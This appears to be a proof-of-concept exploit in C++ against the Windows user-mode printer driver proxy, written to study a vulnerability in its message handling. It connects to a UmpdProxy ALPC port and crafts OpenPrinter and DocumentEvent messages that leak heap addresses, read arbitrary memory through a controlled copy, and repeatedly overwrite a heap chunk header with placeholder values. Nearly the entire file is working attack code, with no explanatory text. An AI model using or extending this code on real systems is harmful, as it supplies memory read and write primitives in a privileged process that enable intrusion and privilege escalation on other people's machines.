#include <iostream>;
#include "windows.h";
#include "Shlwapi.h";
#include "winternl.h";

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shlwapi.lib")

typedef struct _PORT_VIEW
{
    UINT64 Length;
    HANDLE SectionHandle;
    UINT64 SectionOffset;
    UINT64 ViewSize;
    UCHAR* ViewBase;
    UCHAR* ViewRemoteBase;
} PORT_VIEW, * PPORT_VIEW;

typedef struct _PORT_MESSAGE_HEADER {
    USHORT DataSize;
    USHORT MessageSize;
    USHORT MessageType;
    USHORT VirtualRangesOffset;
    CLIENT_ID ClientId;
    UINT64 MessageId;
    UINT64 SectionSize;
} PORT_MESSAGE_HEADER, * PPORT_MESSAGE_HEADER;

typedef struct _PORT_MESSAGE {
    PORT_MESSAGE_HEADER MessageHeader;
    UINT64 MsgSendLen;
    UINT64 PtrMsgSend;
    UINT64 MsgReplyLen;
    UINT64 PtrMsgReply;
    UCHAR Unk4[0x1F8];
} PORT_MESSAGE, * PPORT_MESSAGE;

typedef struct _MView {
    PORT_VIEW ClientView;
    PORT_MESSAGE LpcRequest;
    PORT_MESSAGE LpcReply;
    UINT64 Cookie;
    HANDLE hPortHandle;
    UINT64 MsgSize;
} MView, *PMView;

NTSTATUS(NTAPI* NtOpenProcessToken)(
    _In_ HANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE TokenHandle
    );

NTSTATUS(NTAPI* ZwQueryInformationToken)(
    _In_ HANDLE TokenHandle,
    _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
    _Out_writes_bytes_to_opt_(TokenInformationLength, *ReturnLength) PVOID TokenInformation,
    _In_ ULONG TokenInformationLength,
    _Out_ PULONG ReturnLength
    );

NTSTATUS(NTAPI* NtCreateSection)(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle
    );

NTSTATUS(NTAPI* ZwSecureConnectPort)(
    _Out_ PHANDLE PortHandle,
    _In_ PUNICODE_STRING PortName,
    _In_ PSECURITY_QUALITY_OF_SERVICE SecurityQos,
    _Inout_opt_ PPORT_VIEW ClientView,
    _In_opt_ PSID Sid,
    _Inout_opt_ PVOID ServerView,
    _Out_opt_ PULONG MaxMessageLength,
    _Inout_opt_ PVOID ConnectionInformation,
    _Inout_opt_ PULONG ConnectionInformationLength
    );

NTSTATUS(NTAPI* NtRequestWaitReplyPort)(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE LpcRequest,
    OUT PPORT_MESSAGE LpcReply
    );

PVOID Prepare0x6DMessage(PMView, UINT64);
PVOID Prepare0x6DMessage(PMView, UINT64, UINT64, UINT64);

int Init()
{
    HMODULE ntdll = GetModuleHandleA("ntdll");

    printf("ntdll = 0x%llX\n", ntdll);

    NtOpenProcessToken = (NTSTATUS(NTAPI*) (HANDLE, ACCESS_MASK, PHANDLE)) GetProcAddress(ntdll, "NtOpenProcessToken");
    if (NtOpenProcessToken == NULL)
    {
        printf("Failed to get NtOpenProcessToken\n");
        return 0;
    }

    ZwQueryInformationToken = (NTSTATUS(NTAPI*) (HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG, PULONG)) GetProcAddress(ntdll, "ZwQueryInformationToken");
    if (ZwQueryInformationToken == NULL)
    {
        printf("Failed to get ZwQueryInformationToken\n");
        return 0;
    }

    NtCreateSection = (NTSTATUS(NTAPI*) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE)) GetProcAddress(ntdll, "NtCreateSection");
    if (NtCreateSection == NULL)
    {
        printf("Failed to get NtCreateSection\n");
        return 0;
    }

    ZwSecureConnectPort = (NTSTATUS(NTAPI*) (PHANDLE, PUNICODE_STRING, PSECURITY_QUALITY_OF_SERVICE, PPORT_VIEW, PSID, PVOID, PULONG, PVOID, PULONG)) GetProcAddress(ntdll, "ZwSecureConnectPort");
    if (ZwSecureConnectPort == NULL)
    {
        printf("Failed to get ZwSecureConnectPort\n");
        return 0;
    }

    NtRequestWaitReplyPort = (NTSTATUS(NTAPI*) (HANDLE, PPORT_MESSAGE, PPORT_MESSAGE)) GetProcAddress(ntdll, "NtRequestWaitReplyPort");
    if (NtRequestWaitReplyPort == NULL)
    {
        printf("Failed to get NtRequestWaitReplyPort\n");
        return 0;
    }

    return 1;
}

int GetPortName(PUNICODE_STRING DestinationString)
{
    void* tokenHandle;
    DWORD sessionId;
    ULONG length;

    int tokenInformation[16];
    WCHAR dst[256];

    memset(tokenInformation, 0, sizeof(tokenInformation));
    ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);

    memset(dst, 0, sizeof(dst));

    if (NtOpenProcessToken(GetCurrentProcess(), 0x20008u, &tokenHandle)
        || ZwQueryInformationToken(tokenHandle, TokenStatistics, tokenInformation, 0x38u, &length))
    {
        return 0;
    }

    wsprintfW(
        dst,
        L"\\RPC Control\\UmpdProxy_%x_%x_%x_%x",
        sessionId,
        tokenInformation[2],
        tokenInformation[3],
        0x2000);
    printf("name: %ls\n", dst);
    RtlInitUnicodeString(DestinationString, dst);

    return 1;
}

HANDLE CreatePortSharedBuffer(PPORT_VIEW ClientView, PUNICODE_STRING PortName)
{
    HANDLE sectionHandle = 0;
    HANDLE portHandle = 0;
    union _LARGE_INTEGER maximumSize;
    maximumSize.QuadPart = 0x20000;

    if (0 != NtCreateSection(&sectionHandle, SECTION_MAP_WRITE | SECTION_MAP_READ, 0, &maximumSize, PAGE_READWRITE, SEC_COMMIT, NULL)) {
        printf("failed on NtCreateSection\n");
        return 0;
    }
    if (sectionHandle)
    {
        ClientView->SectionHandle = sectionHandle;
        ClientView->Length = 0x30;
        ClientView->ViewSize = 0x9000;
        int retval = ZwSecureConnectPort(&portHandle, PortName, NULL, ClientView, NULL, NULL, NULL, NULL, NULL);
        if (retval) {
            printf("Failed on ZwSecureConnectPort: 0x%x\n", retval);
            return 0;
        }
    }

    return portHandle;
}

PVOID Prepare0x6AMessage(PMView mview)
{
    const wchar_t* printerName = L"Microsoft XPS Document Writer";
    memset(&mview->LpcRequest, 0, sizeof(mview->LpcRequest));
    mview->LpcRequest.MessageHeader.DataSize = 0x20;
    mview->LpcRequest.MessageHeader.MessageSize = 0x48;

    mview->LpcRequest.MsgSendLen = 0x300;
    mview->LpcRequest.PtrMsgSend = (UINT64)mview->ClientView.ViewRemoteBase;
    mview->LpcRequest.MsgReplyLen = 0x10;
    mview->LpcRequest.PtrMsgReply = (UINT64)mview->ClientView.ViewRemoteBase + 0x140;
    //printf("PtrMsgReply: 0x%p\n", LpcRequest.PtrMsgReply);
    memcpy(&mview->LpcReply, &mview->LpcRequest, sizeof(mview->LpcRequest));
    memcpy(&mview->LpcReply, &mview->LpcRequest, sizeof(mview->LpcRequest));

    *(UINT64*)mview->ClientView.ViewBase = 0x6A00000000; //Msg Type (OpenPrinter)
    *((UINT64*)mview->ClientView.ViewBase + 0x3) = 0x100; // Offset to pointer to Printer Name 
    *((UINT64*)mview->ClientView.ViewBase + 0x4) = 0x00; //Printer defaults to OpenPrinter
    *((UINT64*)mview->ClientView.ViewBase + 0x8) = 0x00;
    *((UINT64*)mview->ClientView.ViewBase + 0x7) = 0x500000005; // Args 2 & 3 to bAddPrinterHandle

    memcpy(mview->ClientView.ViewBase + 0x100, printerName, 0x3C);
    *((UINT64*)mview->ClientView.ViewBase + 0x10) = 0x41414141;
    return mview->ClientView.ViewBase;
}

// only does 8 byte reads atm; update 0xA2/0xA3 to increase
PVOID PrepareForRead(PMView mview, UINT64 heapAddress, UINT64 readAddress)
{
    memset(&mview->LpcRequest, 0, sizeof(mview->LpcRequest));
    mview->LpcRequest.MessageHeader.DataSize = 0x20;
    mview->LpcRequest.MessageHeader.MessageSize = 0x48;

    mview->LpcRequest.MsgSendLen = mview->MsgSize;
    mview->LpcRequest.PtrMsgSend = (UINT64)mview->ClientView.ViewRemoteBase;
    mview->LpcRequest.MsgReplyLen = 0x10;
    mview->LpcRequest.PtrMsgReply = (UINT64)mview->ClientView.ViewRemoteBase + 0x88;

    memcpy(&mview->LpcReply, &mview->LpcRequest, sizeof(mview->LpcRequest));
    memset(mview->ClientView.ViewBase, 0, mview->MsgSize);

    *(UINT64*)mview->ClientView.ViewBase = 0x6D00000000; //Msg Type (Document Event)
    *((UINT64*)mview->ClientView.ViewBase + 3) = mview->Cookie;
    *((UINT64*)mview->ClientView.ViewBase + 4) = 0x500000005;  // 2nd arg to FindPrinterHandle

    // 0x0003 is for the second switch inside gdi32full!GdiPrinterTHunk
    *((UINT64*)mview->ClientView.ViewBase + 7) = 0x2000000003; //iEsc argument to DocumentEvent & cbIn
    //0x40
    *((UINT64*)mview->ClientView.ViewBase + 8) = 0x100;//OFFSET-  pvIn
    *((UINT64*)mview->ClientView.ViewBase + 9) = 0x200; //cbOut
    //0x200
    *((UINT64*)mview->ClientView.ViewBase + 0x40) = 0x6767;
    //0x100
    *((UINT64*)mview->ClientView.ViewBase + 0x20) = 0x40;// 0x40; // +B points here 
    //0x110
    *((UINT64*)mview->ClientView.ViewBase + 0x22) = NULL;
    //0x150
    *((UINT64*)mview->ClientView.ViewBase + 0x2A) = (UINT64)mview->ClientView.ViewRemoteBase + 0x200;
    //0x250
    *((UINT64*)mview->ClientView.ViewBase + 0x4A) = (UINT64)0; //Where the contents of memcpy are written to

    *((UINT64*)mview->ClientView.ViewBase + 0x40) = 0x4242424242424242;
    *((UINT64*)mview->ClientView.ViewBase + 0xA) = 0x60; // offset to address of source pointer
    *((WORD*)mview->ClientView.ViewBase + 0xA2) = (WORD)0x04;
    *((WORD*)mview->ClientView.ViewBase + 0xA3) = (WORD)0x04;
    *((UINT64*)mview->ClientView.ViewBase + 0xB) = 0x250; //Destination of memcpy
    *((UINT64*)mview->ClientView.ViewBase + 0x4A) = (UINT64)0; //Where the contents of memcpy are written to

    // 0x60; read address
    *((UINT64*)mview->ClientView.ViewBase + 0xC) = readAddress;
    
    return mview->ClientView.ViewBase;
}

PVOID Prepare0x6DMessage(PMView mview, UINT64 heapAddress)
{
    return Prepare0x6DMessage(mview, heapAddress, 0x41414141, 0x4242424242424242);
}

PVOID Prepare0x6DMessage(PMView mview, UINT64 heapAddress, UINT64 overwriteDest, UINT64 overwriteValue)
{
    memset(&mview->LpcRequest, 0, sizeof(mview->LpcRequest));
    mview->LpcRequest.MessageHeader.DataSize = 0x20;
    mview->LpcRequest.MessageHeader.MessageSize = 0x48;

    mview->LpcRequest.MsgSendLen = mview->MsgSize;
    mview->LpcRequest.PtrMsgSend = (UINT64)mview->ClientView.ViewRemoteBase;
    mview->LpcRequest.MsgReplyLen = 0x10;
    mview->LpcRequest.PtrMsgReply = (UINT64)mview->ClientView.ViewRemoteBase + 0x88;

    memcpy(&mview->LpcReply, &mview->LpcRequest, sizeof(mview->LpcRequest));
    memset(mview->ClientView.ViewBase, 0, mview->MsgSize);

    *(UINT64*)mview->ClientView.ViewBase = 0x6D00000000; //Msg Type (Document Event)
    *((UINT64*)mview->ClientView.ViewBase + 3) = mview->Cookie;
    *((UINT64*)mview->ClientView.ViewBase + 4) = 0x500000005;  // 2nd arg to FindPrinterHandle

    // 0x0003 is for the second switch inside gdi32full!GdiPrinterTHunk
    *((UINT64*)mview->ClientView.ViewBase + 7) = 0x2000000003; //iEsc argument to DocumentEvent & cbIn
    //0x40
    *((UINT64*)mview->ClientView.ViewBase + 8) = 0x100;//OFFSET-  pvIn
    *((UINT64*)mview->ClientView.ViewBase + 9) = 0x200; //cbOut
    //0x200
    *((UINT64*)mview->ClientView.ViewBase + 0x40) = 0x6767;
    //0x100
    *((UINT64*)mview->ClientView.ViewBase + 0x20) = 0x40; // +B points here 
    //0x110
    *((UINT64*)mview->ClientView.ViewBase + 0x22) = NULL;
    //0x150
    *((UINT64*)mview->ClientView.ViewBase + 0x2A) = (UINT64)mview->ClientView.ViewRemoteBase + 0x200;
    //0x250
    *((UINT64*)mview->ClientView.ViewBase + 0x4A) = (UINT64)0; //Where the contents of memcpy are written to

    if (!heapAddress) {
        *((UINT64*)mview->ClientView.ViewBase + 0xA) = 0x150; //Buffer out to DocumentEvent, pointer to pointer of src of memcpy
        *((UINT64*)mview->ClientView.ViewBase + 0x40) = overwriteValue;
        *((UINT64*)mview->ClientView.ViewBase + 0xA) = 0x40; //Buffer out to DocumentEvent, pointer to pointer of src of memcpy
        *((WORD*)mview->ClientView.ViewBase + 0xA2) = (WORD)0x04;
        *((WORD*)mview->ClientView.ViewBase + 0xA3) = (WORD)0x04;
        *((UINT64*)mview->ClientView.ViewBase + 0xB) = 0x250; //Destination of memcpy
        *((UINT64*)mview->ClientView.ViewBase + 0x4A) = (UINT64)0; //Where the contents of memcpy are written to
    }
    else {
        *((UINT64*)mview->ClientView.ViewBase + 0xA) = 0x150; //Buffer out to DocumentEvent, pointer to pointer of src of memcpy
        *((UINT64*)mview->ClientView.ViewBase + 0x40) = overwriteValue; //Source contents to write
        *((UINT64*)mview->ClientView.ViewBase + 0xB) = overwriteDest - heapAddress; //Destination of memcpy
        *((WORD*)mview->ClientView.ViewBase + 0x122) = (WORD)0x04; // offset +0x122 and +0x123 are added together to create the size of memcpy
        *((WORD*)mview->ClientView.ViewBase + 0x123) = (WORD)0x04;
    }

    return mview->ClientView.ViewBase;
}

UINT64 LeakAddress(PMView mview, UINT64 HeapAddress, UINT64 targetAddress)
{
    if (!(mview->ClientView.ViewBase && mview->ClientView.ViewRemoteBase))
        return 0;

    if (mview->Cookie == 0)
    {
        Prepare0x6AMessage(mview);
        if (NtRequestWaitReplyPort(mview->hPortHandle, &mview->LpcRequest, &mview->LpcReply) != 0) {
            printf("Writing message 0x6A failed\n");
            exit(1);
        }

        mview->Cookie = *((UINT64*)mview->ClientView.ViewBase + 0x28);
    }

    PrepareForRead(mview, HeapAddress, targetAddress);
    if (NtRequestWaitReplyPort(mview->hPortHandle, &mview->LpcRequest, &mview->LpcReply) != 0) {
        printf("Writing message 0x6A failed\n");
        exit(1);
    }

    return *((UINT64*)mview->ClientView.ViewBase + 0x4A) - 0x40;
}

UINT64 LeakHeapAddress(PMView mview)
{
    if (!(mview->ClientView.ViewBase && mview->ClientView.ViewRemoteBase))
        return 0;

    if (mview->Cookie == 0)
    {
        Prepare0x6AMessage(mview);
        if (NtRequestWaitReplyPort(mview->hPortHandle, &mview->LpcRequest, &mview->LpcReply) != 0) {
            printf("Writing message 0x6A failed\n");
            exit(1);
        }

        mview->Cookie = *((UINT64*)mview->ClientView.ViewBase + 0x28);
    }

    Prepare0x6DMessage(mview, 0);
    if (NtRequestWaitReplyPort(mview->hPortHandle, &mview->LpcRequest, &mview->LpcReply) != 0) {
        printf("Writing message 0x6D (first time) failed\n");
        exit(1);
    }

    return *((UINT64*)mview->ClientView.ViewBase + 0x4A) - 0x40;
}

void Loop6D(PMView mview)
{
    while (true)
        LeakHeapAddress(mview);
}

int main()
{
    Init();

    CHAR Path[0x100];

    GetCurrentDirectoryA(sizeof(Path), Path);
    printf("%s\n", Path);
    PathAppendA(Path, "CreateDC.exe");
    printf("%s\n", Path);

    if (!(PathFileExistsA(Path)))
    {
        printf("CreateDC.exe does not exist\n");
        return 0;
    }
    WinExec(Path, 0);

    CreateDCW(L"Microsoft XPS Document Writer", L"Microsoft XPS Document Writer", NULL, NULL);

    printf("Debugger..\n");
    fflush(stdout);
    getchar();

    UNICODE_STRING portName;
    if (!GetPortName(&portName))
    {
        printf("Failed to get port name\n");
        return 0;
    }

    MView PortViewA = { 0 }, PortViewB = { 0 };

    PortViewA.hPortHandle = CreatePortSharedBuffer(&PortViewA.ClientView, &portName);
    GetPortName(&portName);
    PortViewB.hPortHandle = CreatePortSharedBuffer(&PortViewB.ClientView, &portName);

    if (!(PortViewA.hPortHandle && PortViewB.hPortHandle))
    {
        printf("PortViewA = 0x%llX && PortViewB = 0x%llX\n", PortViewA.hPortHandle, PortViewB.hPortHandle);
        return 0;
    }

    PortViewA.MsgSize = 0x300;
    PortViewB.MsgSize = 0x2000-8;

    /* trigger LFH
    UINT64 pv = 0;
    for (int i = 0; i < 2500; ++i) {
        pv = LeakHeapAddress(&PortViewA);
        LeakHeapAddress(&PortViewB);
    }
    */

    UINT64 PortViewAHeap = LeakHeapAddress(&PortViewA);
    UINT64 PortViewBHeap = LeakHeapAddress(&PortViewB);
    printf("PVA @ 0x%p\nPVB @ 0x%p\n", PortViewAHeap, PortViewBHeap);

    if (PortViewAHeap == PortViewBHeap)
    {
        printf("Something went terribly wrong, check sizes?\n");
        return 1;
    }
    
    // leak chunk header
    UINT64 Header = LeakAddress(&PortViewA, PortViewAHeap, PortViewBHeap - 8);
    printf("Chunk header %llx\n", Header);

    // start PortViewA thread that just runs 0x6d's
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop6D, &PortViewB, 0, NULL);

    // spin trying to smash PortViewA's header
    while (true)
    {
        Prepare0x6DMessage(&PortViewA, PortViewAHeap, PortViewBHeap-8, 0x4141414141414141);
        if (NtRequestWaitReplyPort(PortViewA.hPortHandle, &PortViewA.LpcRequest, &PortViewA.LpcReply) != 0) {
            exit(1);
        }
    }

    return 0;
}